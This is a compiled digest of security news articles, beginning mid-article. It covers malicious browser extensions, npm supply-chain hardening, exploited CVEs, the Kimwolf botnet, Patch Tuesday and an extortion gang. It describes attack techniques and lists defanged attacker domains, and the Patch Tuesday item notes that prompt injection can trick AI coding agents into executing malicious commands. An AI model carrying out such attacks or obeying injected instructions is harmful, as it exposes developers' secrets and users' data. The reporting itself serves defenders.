The malware embedded in the extensions is designed to engage in active account manipulation by automatically subscribing users to the attacker's VK groups, resetting account settings every 30 days to override user preferences, manipulating Cross-Site Request Forgery (CSRF) tokens to bypass VK's security protections, and maintaining persistent control.

The activity has been traced to a threat actor operating under the GitHub username 2vk, who has relied on VK's own social network to distribute malicious payloads and build a follower base through forced subscriptions. The names of the extensions are listed below -

VK Styles - Themes for vk.com (ID: ceibjdigmfbbgcpkkdpmjokkokklodmc)

VK Music - audio saver (ID: mflibpdjoodmoppignjhciadahapkoch)

Music Downloader - VKsaver (ID: lgakkahjfibfgmacigibnhcgepajgfdb)

vksaver - music saver vk (ID: bndkfmmbidllaiccmpnbdonijmicaafn)

VKfeed - Download Music and Video from VK (ID: pcdgkgbadeggbnodegejccjffnoakcoh)

One of the defining traits of the campaign is the use of a VK profile's ("vk[.]com/m0nda") HTML metadata tags as a dead drop resolver to conceal the next-stage payload URLs and, therefore, evade detection. The next-stage payload is hosted in a public repository named "-" that's associated with 2vk. Present in the payload is obfuscated JavaScript that's injected into every VK page the victim visits.

The repository is still accessible as of writing, with the file, simply named "C," receiving a total of 17 commits between June 2025 and January 2026, as the operator refined and added new functionality.

"Each commit shows deliberate refinement," security researcher Ariel Cohen said. "This isn't sloppy malware - it's a maintained software project with version control, testing, and iterative improvements."

VK Styles has primarily affected Russian-speaking users, who are VK's main demographic, as well as users across Eastern Europe, Central Asia, and Russian diaspora communities globally. The campaign is assessed to be active since at least June 22, 2025, when the initial version of the payload was pushed to the "-" repository.

Fake AI Chrome Extensions Steal Credentials, Emails

The findings also coincide with the discovery of another coordinated campaign dubbed AiFrame, where a cluster of 32 browser add-ons advertised as artificial intelligence (AI) assistants for summarization, chat, writing, and Gmail assistance are being used to siphon sensitive data. These extensions have been collectively installed by more than 260,000 users.

"While these tools appear legitimate on the surface, they hide a dangerous architecture: instead of implementing core functionality locally, they embed remote, server-controlled interfaces inside extension-controlled surfaces and act as privileged proxies, granting remote infrastructure access to sensitive browser capabilities," LayerX researcher Natalie Zargarov said.

The names of the malicious extensions are as follows -

Chat GPT for Gmail (ID: fpmkabpaklbhbhegegapfkenkmpipick)

Once installed, these extensions render a full-screen iframe overlay pointing to a remote domain ("claude.tapnetic[.]pro"), allowing the attackers to remotely introduce new capabilities without requiring a Chrome Web Store update. When instructed by the iframe, the add-ons query the active browser tab and invoke a content script to extract readable article content using Mozilla's Readability library.

The malware also supports the capability to start speech recognition and exfiltrate the resulting transcript to the remote page. What's more, a smaller set of the extensions contain functionality to specifically target Gmail by reading visible email content directly from the document object model (DOM) when a victim visits mail.google[.]com.

"When Gmail-related features such as AI-assisted replies or summaries are invoked, the extracted email content is passed into the extension's logic and transmitted to third-party backend infrastructure controlled by the extension operator," LayerX said. "As a result, email message text and related contextual data may be sent off-device, outside of Gmail’s security boundary, to remote servers."

287 Chrome Extensions Exfiltrate Browsing History

The developments show how web browser extensions are increasingly being abused by bad actors to harvest and exfiltrate sensitive data by passing them off as seemingly legitimate tools and utilities.

A report published by Q Continuum last week found a huge collection of 287 Chrome extensions that exfiltrate browsing history to data brokers. These extensions have 37.4 million installations, representing roughly 1% of the global Chrome userbase.

"It was shown in the past that Chrome extensions are used to exfiltrate user browser history that is then collected by data brokers such as Similarweb and Alexa," the researcher said.

Given the risks involved, users are recommended to adopt a minimalist approach by only installing necessary, well-reviewed tools from official stores. It's also essential to periodically audit installed extensions for any signs of malicious behavior or excessive permission requests.

Other ways that users and organizations can ensure greater security include using separate browser profiles for sensitive tasks and implementing extension allowlisting to block those that are malicious or non-compliant.

[2] The Hacker News - npm’s Update to Harden Their Supply Chain, and Points to Consider
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 16:15:00 +0530
Link: https://thehackernews.com/2026/02/npms-update-to-harden-their-supply.html

[TAM METİN - 833 kelime]
In December 2025, in response to the Sha1-Hulud incident, npm completed a major authentication overhaul intended to reduce supply-chain attacks. While the overhaul is a solid step forward, the changes don’t make npm projects immune from supply-chain attacks. npm is still susceptible to malware attacks – here’s what you need to know for a safer Node community.

Let’s start with the original problem

Historically, npm relied on classic tokens: long-lived, broadly scoped credentials that could persist indefinitely. If stolen, attackers could directly publish malicious versions to the author’s packages (no publicly verifiable source code needed). This made npm a prime vector for supply-chain attacks. Over time, numerous real-world incidents demonstrated this point. Shai-Hulud, Sha1-Hulud, and chalk/debug are examples of recent, notable attacks.

To address this, npm made the following changes:

npm revoked all classic tokens and defaulted to session-based tokens instead. The npm team also improved token management. Interactive workflows now use short-lived session tokens (typically two hours) obtained via npm login, which defaults to MFA for publishing.

The npm team also encourages OIDC Trusted Publishing, in which CI systems obtain short-lived, per-run credentials rather than storing secrets at rest.

In combination, these practices improve security. They ensure credentials expire quickly and require a second factor during sensitive operations.

Two important issues remain

First, people need to remember that the original attack on tools like ChalkJS was a successful MFA phishing attempt on npm’s console. If you look at the original email attached below, you can see it was an MFA-focused phishing email (nothing like trying to do the right thing and still getting burned). The campaign tricked the maintainer into sharing both the user login and one-time password. This means in the future, similar emails could get short-lived tokens, which still give attackers enough time to upload malware (since that would only take minutes).

Second, MFA on publish is optional. Developers can still create 90-day tokens with MFA bypass enabled in the console, which are extremely similar to the classic tokens from before.

These tokens allow you to read and write to a token author’s maintained packages. This means that if bad actors gain access to a maintainer’s console with these token settings, they can publish new, malicious packages (and versions) on that author’s behalf. This circles us back to the original issue with npm before they adjusted their credential policies.

To be clear, more developers using MFA on publish is good news, and future attacks should be fewer and smaller. However, making OIDC and MFA on-publish optional still leaves the core issue unresolved.

In conclusion, if (1) MFA phishing attempts to npm’s console still work and (2) access to the console equals access to publish new packages/versions, then developers need to be aware of the supply-chain risks that still exist.

In the spirit of open source security, here are three recommendations that we hope GitHub and npm will consider in the future.

Ideally, they continue to push for the ubiquity of OIDC in the long term. OIDC is very hard to compromise and would almost completely erase the issues surrounding supply-chain attacks.

More realistically, enforcing MFA for local package uploads (either via an email code or a one-time password) would further reduce the blast radius of worms like Shai-Hulud. In other words, it would be an improvement to not allow custom tokens that bypass MFA.

At a minimum, it would be nice to add metadata to package releases, so developers can take precautions and avoid packages (or maintainers) who do not take supply chain security measures.

In short, npm has taken an important step forward by eliminating permanent tokens and improving defaults. Until short-lived, identity-bound credentials become the norm — and MFA bypass is no longer required for automation — supply-chain risk from compromised build systems remains materially present.

This entire time, we’ve been talking about supply-chain attacks by uploading packages to npm on a maintainer’s behalf. If we could build every npm package from verifiable upstream source code rather than downloading the artifact from npm, we’d be better off. That’s exactly what Chainguard does for its customers with Chainguard Libraries for JavaScript.

We’ve looked at the public database for compromised packages across npm and discovered that for 98.5% of malicious packages, the malware was not present in the upstream source code (just the published artifact). This means an approach of building from source would reduce your attack surface by some 98.5%, based on past data, because Chainguard’s JavaScript repository would never publish the malicious versions available on npm.

In an ideal world, customers are most secure when they use Chainguard Libraries and apply the recommendations above. Per the “Swiss cheese model of security,” all of these features are layers of additive security measures, and companies would be best off using a combination of them.

[3] The Hacker News - Researchers Observe In-the-Wild Exploitation of BeyondTrust CVSS 9.9 Vulnerability
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 14:04:00 +0530
Link: https://thehackernews.com/2026/02/researchers-observe-in-wild.html

[TAM METİN - 864 kelime]
Threat actors have started to exploit a recently disclosed critical security flaw impacting BeyondTrust Remote Support (RS) and Privileged Remote Access (PRA) products, according to watchTowr.

"Overnight we observed first in-the-wild exploitation of BeyondTrust across our global sensors," Ryan Dewhurst, head of threat intelligence at watchTowr, said in a post on X. "Attackers are abusing get_portal_info to extract the x-ns-company value before establishing a WebSocket channel."

The vulnerability in question is CVE-2026-1731 (CVS score: 9.9), which could allow an unauthenticated attacker to achieve remote code execution by sending specially crafted requests.

BeyondTrust noted last week that successful exploitation of the shortcoming could allow an unauthenticated remote attacker to execute operating system commands in the context of the site user, resulting in unauthorized access, data exfiltration, and service disruption.

It has been patched in the following versions -

Remote Support - Patch BT26-02-RS, 25.3.2 and later

Privileged Remote Access - Patch BT26-02-PRA, 25.1.1 and later

The use of CVE-2026-1731 demonstrates how quickly threat actors can weaponize new vulnerabilities, significantly shrinking the window for defenders to patch critical systems.

CISA Adds 4 Flaws to KEV Catalog

The development comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added four vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The list of vulnerabilities is as follows -

CVE-2026-20700 (CVSS score: 7.8) - An improper restriction of operations within the bounds of a memory buffer vulnerability in Apple iOS, macOS, tvOS, watchOS, and visionOS that could allow an attacker with memory write capability to execute arbitrary code.

CVE-2025-15556 (CVSS score: 7.7) - A download of code without an integrity check vulnerability in Notepad++ that could allow an attacker to intercept or redirect update traffic to download and execute an attacker-controlled installer and lead to arbitrary code execution with the privileges of the user.

CVE-2025-40536 (CVSS score: 8.1) - A security control bypass vulnerability in SolarWinds Web Help Desk that could allow an unauthenticated attacker to gain access to certain restricted functionality.

CVE-2024-43468 (CVSS score: 9.8) - An SQL injection vulnerability in Microsoft Configuration Manager that could allow an unauthenticated attacker to execute commands on the server and/or underlying database by sending specially crafted requests.

It's worth noting that CVE-2024-43468 was patched by Microsoft in October 2024 as part of its Patch Tuesday updates. It's currently unclear how this vulnerability is being exploited in real-world attacks. Nor is there any information about the identity of the threat actors exploiting the flaw and the scale of such efforts.

The addition of CVE-2024-43468 to the KEV catalog follows a recent report from Microsoft about a multi‑stage intrusion that involved the threat actors exploiting internet‑exposed SolarWinds Web Help Desk (WHD) instances to obtain initial access and move laterally across the organization's network to other high-value assets.

However, the Windows maker said it's not evident if the attacks exploited CVE-2025-40551, CVE-2025-40536, or CVE-2025-26399, since attacks occurred in December 2025 and on machines vulnerable to both the old and new sets of vulnerabilities.

As for CVE-2026-20700, Apple acknowledged that the shortcoming may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26, raising the possibility that it was leveraged to deliver commercial spyware. It was fixed by the tech giant earlier this week.

Lastly, the exploitation of CVE-2025-15556 has been attributed by Rapid7 to a China-linked state-sponsored threat actor called Lotus Blossom (aka Billbug, Bronze Elgin, G0030, Lotus Panda, Raspberry Typhoon, Spring Dragon, and Thrip). It's known to be active since at least 2009.

The targeted attacks have been found to deliver a previously undocumented backdoor called Chrysalis. While the supply chain attack was fully plugged on December 2, 2025, the compromise of the Notepad++ update pipeline is estimated to have spanned nearly five months between June and October 2025.

The DomainTools Investigations (DTI) team described the incident as precise and a "quiet, methodical intrusion" that points to a covert intelligence-gathering mission designed to keep operational noise as low as possible. It also characterized the threat actor as having a penchant for long dwell times and multi-year campaigns.

An important aspect of the campaign is that the Notepad++ source code was left intact, instead relying on trojanized installers to deliver the malicious payloads. This, in turn, allowed the attackers to bypass source-code reviews and integrity checks, effectively enabling them to stay undetected for extended periods, DTI added.

"From their foothold inside the update infrastructure, the attackers did not indiscriminately push malicious code to the global Notepad++ user base," it said. "Instead, they exercised restraint, selectively diverting update traffic for a narrow set of targets, organizations, and individuals whose positions, access, or technical roles made them strategically valuable."

"By abusing a legitimate update mechanism relied upon specifically by developers and administrators, they transformed routine maintenance into a covert entry point for high-value access. The campaign reflects continuity in purpose, a sustained focus on regional strategic intelligence, executed with more sophisticated, more subtle, and harder-to-detect methods than in prior iterations."

In light of active exploitation of these vulnerabilities, Federal Civilian Executive Branch (FCEB) agencies have until February 15, 2026, to address CVE-2025-40536, and till March 5, 2026, to fix the remaining three.

[4] BleepingComputer - Microsoft fixes bug that blocked Google Chrome from launching
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 04:31:01 -0500
Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-family-safety-bug-that-blocks-google-chrome-from-launching/

[TAM METİN - 484 kelime]
Microsoft has fixed a known issue causing its Family Safety parental control service to block Windows users from launching Google Chrome and other web browsers.

Family Safety helps parents monitor their children's activity and provides screen time management, app controls, communication monitoring, content filtering, location tracking, and activity reports.

Microsoft acknowledged the bug in late June 2025 after widespread reports that users were unable to launch Google Chrome on their PCs or experienced the web browser randomly crashing on devices running Windows 10 22H2 and Windows 11 22H2 or later.

As explained at the time, the issue is caused by Family Safety's web filtering tool, which prompts children to ask their parents for approval to use other browsers. However, the bug also causes Family Safety to block new versions of previously approved web browsers, inadvertently preventing them from launching or causing them to shut down unexpectedly.

"The blocking behavior continues to work, however, when a browser updates to a new version, the latest version of the browser cannot be blocked until we add it to the block list. Microsoft is currently adding the latest versions of Chrome and other browsers to the block list," the company notes on the Windows release health dashboard.

"As Microsoft continues to update the block list, we've received reports of a new issue affecting Google Chrome and some browsers. When children try to open these browsers, they shut down unexpectedly."

Service‑side fix pushed in early February

This week, Microsoft confirmed that it addressed the issue with a service‑side fix earlier this month, nearly eight months after first receiving reports of web browsers shutting down unexpectedly.

Affected users are advised to connect their devices to the Internet to receive the fix, which should address the bug and prevent similar problems in the future.

"This issue has been resolved through a service‑side fix. The rollout began early February 2026 and should reach all affected devices over the coming weeks," Microsoft said. "If your device presented this symptom, please let it connect to the internet to receive the resolution. No other action is required."

Those who can't get online to receive the fix are advised to turn on the 'Activity reporting' feature under Windows settings in Microsoft Family Safety, which will allow parents to receive approval requests as expected and allowlist newer browser versions.

The Russian government is trying to block WhatsApp in the country as its crackdown on communication platforms outside its control intensifies.

WhatsApp announced the action against it on X, calling it “a backwards step” that “can only lead to less safety for people in Russia.”

WhatsApp assured its Russian users that it will continue doing everything it can to keep them connected.

According to Russian media, the country’s internet watchdog, Roskomnadzor, had recently excluded the domains whatsapp.com and web.whatsapp.com from the National Domain Name System, citing the official explanation of countering crime and fraud.

In practice, excluding the domains from domestic DNS routing made WhatsApp services accessible only to users who use VPN tools or external resolvers.

However, more aggressive measures are reportedly now in place, with the latest attempt to fully block WhatsApp in Russia. The instant messenger's parent company, Meta, has been designated as an “extremist” entity in Russia since 2022.

WhatsApp saw its first restrictions in the country in August 2025, when Roskomnadzor began throttling voice and video calls. In October 2025, the authorities attempted to block new user registrations.

Presidential press secretary Dmitry Peskov reportedly stated that the authorities are open to allowing WhatsApp to resume operations in the country, provided that Meta complies with local legislation.

WhatsApp blocks came shortly after similar action was taken against Telegram, which was reportedly aggressively throttled earlier this week in Russia.

Telegram’s founder, Pavel Durov, responded to the situation by stating that Russia is trying to encourage its citizens to use the Kremlin-controlled MAX messenger app.

MAX is a controversial communications platform developed by VK, which became mandatory on all electronic devices sold in the country since September 2025.

Although MAX is promoted as a secure app that safeguards national communications from foreign surveillance, several independent reviewers have raised concerns about encryption weaknesses, government access, and extensive data-collection risks.

For now, users in Russia may be able to continue accessing their messengers of choice by using VPN tools, though those are not immune to the government’s crackdown either.

[6] BleepingComputer - Bitwarden introduces ‘Cupid Vault’ for secure password sharing
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 413 kelime]
Bitwarden has launched a new system called ‘Cupid Vault’ that allows users to safely share passwords with trusted email addresses.

Cupid Vault works by allowing users of the free version of Bitwarden to create a 2-person shared vault called an 'Organization'. Other users can access the logins inside the Organization space with credentials assigned by the owner of the account.

Inviting a user (partner, friend, family member) to an Organization can be done by adding their email address as a second member.

This way, Bitwarden users can share in a secure way collections of login pairs for media streaming service accounts or other online platforms.

Setting up an Organization and creating shared collections is possible by logging into the Bitwarden vault via the web interface.

To prevent adversary-in-the-middle enrollment attacks, vault owners can verify through a fingerprint phrase that the intended member is getting access. The shared vault is completely isolated from the personal vault.

Access to the Organization vault and the secrets it contains can be revoked at any time, and sharing can be configured in both directions.

Bitwarden published a detailed guide on how to set up and use Cupid Vault, which explains that ownership of items within a new Organization isn’t tied to their creator, as both members can perform editing or deletion actions.

Bitwarden is a popular open-source password manager that lets users securely store, generate, and autofill passwords and other sensitive information.

It’s cross-platform, supporting a range of browsers, desktop operating systems, and mobile platforms, and protects stored data using end-to-end encryption.

The new Cupid Vault feature, launched ahead of Valentine’s Day, is available at no charge to all users and can be set up through the free plan. However, there’s a limit of 2 Collections and 2 users each.

Family, Teams, and Enterprise plan users already get multiple users, collections, and granular role-based access control permissions, so Cupid Vault is redundant for paying tiers and shouldn’t be confused with the secret-sharing features available to them.

[7] Krebs on Security - Kimwolf Botnet Swamps Anonymity Network I2P
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 16:08:11 +0000
Link: https://krebsonsecurity.com/2026/02/kimwolf-botnet-swamps-anonymity-network-i2p/

[TAM METİN - 831 kelime]
For the past week, the massive “Internet of Things” (IoT) botnet known as Kimwolf has been disrupting The Invisible Internet Project (I2P), a decentralized, encrypted communications network designed to anonymize and secure online communications. I2P users started reporting disruptions in the network around the same time the Kimwolf botmasters began relying on it to evade takedown attempts against the botnet’s control servers.

Kimwolf is a botnet that surfaced in late 2025 and quickly infected millions of systems, turning poorly secured IoT devices like TV streaming boxes, digital picture frames and routers into relays for malicious traffic and abnormally large distributed denial-of-service (DDoS) attacks.

I2P is a decentralized, privacy-focused network that allows people to communicate and share information anonymously.

“It works by routing data through multiple encrypted layers across volunteer-operated nodes, hiding both the sender’s and receiver’s locations,” the I2P website explains. “The result is a secure, censorship-resistant network designed for private websites, messaging, and data sharing.”

On February 3, I2P users began complaining on the organization’s GitHub page about tens of thousands of routers suddenly overwhelming the network, preventing existing users from communicating with legitimate nodes. Users reported a rapidly increasing number of new routers joining the network that were unable to transmit data, and that the mass influx of new systems had overwhelmed the network to the point where users could no longer connect.

I2P users complaining about service disruptions from a rapidly increasing number of routers suddenly swamping the network.

When one I2P user asked whether the network was under attack, another user replied, “Looks like it. My physical router freezes when the number of connections exceeds 60,000.”

A graph shared by I2P developers showing a marked drop in successful connections on the I2P network around the time the Kimwolf botnet started trying to use the network for fallback communications.

The same day that I2P users began noticing the outages, the individuals in control of Kimwolf posted to their Discord channel that they had accidentally disrupted I2P after attempting to join 700,000 Kimwolf-infected bots as nodes on the network.

The Kimwolf botmaster openly discusses what they are doing with the botnet in a Discord channel with my name on it.

Although Kimwolf is known as a potent weapon for launching DDoS attacks, the outages caused this week by some portion of the botnet attempting to join I2P are what’s known as a “Sybil attack,” a threat in peer-to-peer networks where a single entity can disrupt the system by creating, controlling, and operating a large number of fake, pseudonymous identities.

Indeed, the number of Kimwolf-infected routers that tried to join I2P this past week was many times the network’s normal size. I2P’s Wikipedia page says the network consists of roughly 55,000 computers distributed throughout the world, with each participant acting as both a router (to relay traffic) and a client.

However, Lance James, founder of the New York City based cybersecurity consultancy Unit 221B and the original founder of I2P, told KrebsOnSecurity the entire I2P network now consists of between 15,000 and 20,000 devices on any given day.

An I2P user posted this graph on Feb. 10, showing tens of thousands of routers — mostly from the United States — suddenly attempting to join the network.

Benjamin Brundage is founder of Synthient, a startup that tracks proxy services and was the first to document Kimwolf’s unique spreading techniques. Brundage said the Kimwolf operator(s) have been trying to build a command and control network that can’t easily be taken down by security companies and network operators that are working together to combat the spread of the botnet.

Brundage said the people in control of Kimwolf have been experimenting with using I2P and a similar anonymity network — Tor — as a backup command and control network, although there have been no reports of widespread disruptions in the Tor network recently.

“I don’t think their goal is to take I2P down,” he said. “It’s more they’re looking for an alternative to keep the botnet stable in the face of takedown attempts.”

The Kimwolf botnet created challenges for Cloudflare late last year when it began instructing millions of infected devices to use Cloudflare’s domain name system (DNS) settings, causing control domains associated with Kimwolf to repeatedly usurp Amazon, Apple, Google and Microsoft in Cloudflare’s public ranking of the most frequently requested websites.

James said the I2P network is still operating at about half of its normal capacity, and that a new release is rolling out which should bring some stability improvements over the next week for users.

Meanwhile, Brundage said the good news is Kimwolf’s overlords appear to have quite recently alienated some of their more competent developers and operators, leading to a rookie mistake this past week that caused the botnet’s overall numbers to drop by more than 600,000 infected systems.

“It seems like they’re just testing stuff, like running experiments in production,” he said. “But the botnet’s numbers are dropping significantly now, and they don’t seem to know what they’re doing.”

[8] Krebs on Security - Patch Tuesday, February 2026 Edition

[TAM METİN - 515 kelime]
Microsoft today released updates to fix more than 50 security holes in its Windows operating systems and other software, including patches for a whopping six “zero-day” vulnerabilities that attackers are already exploiting in the wild.

Zero-day #1 this month is CVE-2026-21510, a security feature bypass vulnerability in Windows Shell wherein a single click on a malicious link can quietly bypass Windows protections and run attacker-controlled content without warning or consent dialogs. CVE-2026-21510 affects all currently supported versions of Windows.

The zero-day flaw CVE-2026-21513 is a security bypass bug targeting MSHTML, the proprietary engine of the default Web browser in Windows. CVE-2026-21514 is a related security feature bypass in Microsoft Word.

The zero-day CVE-2026-21533 allows local attackers to elevate their user privileges to “SYSTEM” level access in Windows Remote Desktop Services. CVE-2026-21519 is a zero-day elevation of privilege flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user’s screen. Microsoft fixed a different zero-day in DWM just last month.

The sixth zero-day is CVE-2026-21525, a potentially disruptive denial-of-service vulnerability in the Windows Remote Access Connection Manager, the service responsible for maintaining VPN connections to corporate networks.

Chris Goettl at Ivanti reminds us Microsoft has issued several out-of-band security updates since January’s Patch Tuesday. On January 17, Microsoft pushed a fix that resolved a credential prompt failure when attempting remote desktop or remote application connections. On January 26, Microsoft patched a zero-day security feature bypass vulnerability (CVE-2026-21509) in Microsoft Office.

Kev Breen at Immersive notes that this month’s Patch Tuesday includes several fixes for remote code execution vulnerabilities affecting GitHub Copilot and multiple integrated development environments (IDEs), including VS Code, Visual Studio, and JetBrains products. The relevant CVEs are CVE-2026-21516, CVE-2026-21523, and CVE-2026-21256.

Breen said the AI vulnerabilities Microsoft patched this month stem from a command injection flaw that can be triggered through prompt injection, or tricking the AI agent into doing something it shouldn’t — like executing malicious code or commands.

“Developers are high-value targets for threat actors, as they often have access to sensitive data such as API keys and secrets that function as keys to critical infrastructure, including privileged AWS or Azure API keys,” Breen said. “When organizations enable developers and automation pipelines to use LLMs and agentic AI, a malicious prompt can have significant impact. This does not mean organizations should stop using AI. It does mean developers should understand the risks, teams should clearly identify which systems and workflows have access to AI agents, and least-privilege principles should be applied to limit the blast radius if developer secrets are compromised.”

The SANS Internet Storm Center has a clickable breakdown of each individual fix this month from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on wonky updates. Please don’t neglect to back up your data if it has been a while since you’ve done that, and feel free to sound off in the comments if you experience problems installing any of these fixes.

[9] Krebs on Security - Please Don’t Feed the Scattered Lapsus ShinyHunters

[TAM METİN - 1200 kelime]
A prolific data ransom gang that calls itself Scattered Lapsus ShinyHunters (SLSH) has a distinctive playbook when it seeks to extort payment from victim firms: Harassing, threatening and even swatting executives and their families, all while notifying journalists and regulators about the extent of the intrusion. Some victims reportedly are paying — perhaps as much to contain the stolen data as to stop the escalating personal attacks. But a top SLSH expert warns that engaging at all beyond a “We’re not paying” response only encourages further harassment, noting that the group’s fractious and unreliable history means the only winning move is not to pay.

Unlike traditional, highly regimented Russia-based ransomware affiliate groups, SLSH is an unruly and somewhat fluid English-language extortion gang that appears uninterested in building a reputation of consistent behavior whereby victims might have some measure of confidence that the criminals will keep their word if paid.

That’s according to Allison Nixon, director of research at the New York City based security consultancy Unit 221B. Nixon has been closely tracking the criminal group and individual members as they bounce between various Telegram channels used to extort and harass victims, and she said SLSH differs from traditional data ransom groups in other important ways that argue against trusting them to do anything they say they’ll do — such as destroying stolen data.

Like SLSH, many traditional Russian ransomware groups have employed high-pressure tactics to force payment in exchange for a decryption key and/or a promise to delete stolen data, such as publishing a dark web shaming blog with samples of stolen data next to a countdown clock, or notifying journalists and board members of the victim company. But Nixon said the extortion from SLSH quickly escalates way beyond that — to threats of physical violence against executives and their families, DDoS attacks on the victim’s website, and repeated email-flooding campaigns.

SLSH is known for breaking into companies by phishing employees over the phone, and using the purloined access to steal sensitive internal data. In a January 30 blog post, Google’s security forensics firm Mandiant said SLSH’s most recent extortion attacks stem from incidents spanning early to mid-January 2026, when SLSH members pretended to be IT staff and called employees at targeted victim organizations claiming that the company was updating MFA settings.

“The threat actor directed the employees to victim-branded credential harvesting sites to capture their SSO credentials and MFA codes, and then registered their own device for MFA,” the blog post explained.

Victims often first learn of the breach when their brand name is uttered on whatever ephemeral new public Telegram group chat SLSH is using to threaten, extort and harass their prey. According to Nixon, the coordinated harassment on the SLSH Telegram channels is part of a well-orchestrated strategy to overwhelm the victim organization by manufacturing humiliation that pushes them over the threshold to pay.

Nixon said multiple executives at targeted organizations have been subject to “swatting” attacks, wherein SLSH communicated a phony bomb threat or hostage situation at the target’s address in the hopes of eliciting a heavily armed police response at their home or place of work.

“A big part of what they’re doing to victims is the psychological aspect of it, like harassing executives’ kids and threatening the board of the company,” Nixon told KrebsOnSecurity. “And while these victims are getting extortion demands, they’re simultaneously getting outreach from media outlets saying, ‘Hey, do you have any comments on the bad things we’re going to write about you.”

In a blog post today, Unit 221B argues that no one should negotiate with SLSH because the group has demonstrated a willingness to extort victims based on promises that it has no intention to keep. Nixon points out that all of SLSH’s known members hail from The Com, shorthand for a constellation of cybercrime-focused Discord and Telegram communities which serve as a kind of distributed social network that facilitates instant collaboration.

Nixon said Com-based extortion groups tend to instigate feuds and drama between group members, leading to lying, betrayals, credibility destroying behavior, backstabbing, and sabotaging each other.

“With this type of ongoing dysfunction, often compounding by substance abuse, these threat actors often aren’t able to act with the core goal in mind of completing a successful, strategic ransom operation,” Nixon wrote. “They continually lose control with outbursts that put their strategy and operational security at risk, which severely limits their ability to build a professional, scalable, and sophisticated criminal organization network for continued successful ransoms – unlike other, more tenured and professional criminal organizations focused on ransomware alone.”

Intrusions from established ransomware groups typically center around encryption/decryption malware that mostly stays on the affected machine. In contrast, Nixon said, ransom from a Com group is often structured the same as violent sextortion schemes against minors, wherein members of The Com will steal damaging information, threaten to release it, and “promise” to delete it if the victim complies without any guarantee or technical proof point that they will keep their word. She writes:

A key component of SLSH’s efforts to convince victims to pay, Nixon said, involves manipulating the media into hyping the threat posed by this group. This approach also borrows a page from the playbook of sextortion attacks, she said, which encourages predators to keep targets continuously engaged and worrying about the consequences of non-compliance.

“On days where SLSH had no substantial criminal ‘win’ to announce, they focused on announcing death threats and harassment to keep law enforcement, journalists, and cybercrime industry professionals focused on this group,” she said.

Nixon knows a thing or two about being threatened by SLSH: For the past several months, the group’s Telegram channels have been replete with threats of physical violence against her, against Yours Truly, and against other security researchers. These threats, she said, are just another way the group seeks to generate media attention and achieve a veneer of credibility, but they are useful as indicators of compromise because SLSH members tend to name drop and malign security researchers even in their communications with victims.

“Watch for the following behaviors in their communications to you or their public statements,” Unit 221B’s advisory reads. “Repeated abusive mentions of Allison Nixon (or “A.N”), Unit 221B, or cybersecurity journalists—especially Brian Krebs—or any other cybersecurity employee, or cybersecurity company. Any threats to kill, or commit terrorism, or violence against internal employees, cybersecurity employees, investigators, and journalists.”

Unit 221B says that while the pressure campaign during an extortion attempt may be traumatizing to employees, executives, and their family members, entering into drawn-out negotiations with SLSH incentivizes the group to increase the level of harm and risk, which could include the physical safety of employees and their families.

“The breached data will never go back to the way it was, but we can assure you that the harassment will end,” Nixon said. “So, your decision to pay should be a separate issue from the harassment. We believe that when you separate these issues, you will objectively see that the best course of action to protect your interests, in both the short and long term, is to refuse payment.”

[10] Threatpost - Student Loan Breach Exposes 2.5M Records
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 31 Aug 2022 12:57:48 +0000

[TAM METİN - 511 kelime]
2.5 million people were affected, in a breach that could spell more trouble down the line.

EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.

The target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.

Nelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.

“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.

By August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.

According to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.

“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website

portal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.

It’s unclear what the vulnerability was.

“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.

Loan Recipient Targets

Although users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.

“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.

Last week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.

She warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.

“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.

According to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”

Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.

[11] Threatpost - Watering Hole Attacks Push ScanBox Keylogger
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 30 Aug 2022 16:00:43 +0000
Link: https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/

[TAM METİN - 918 kelime]
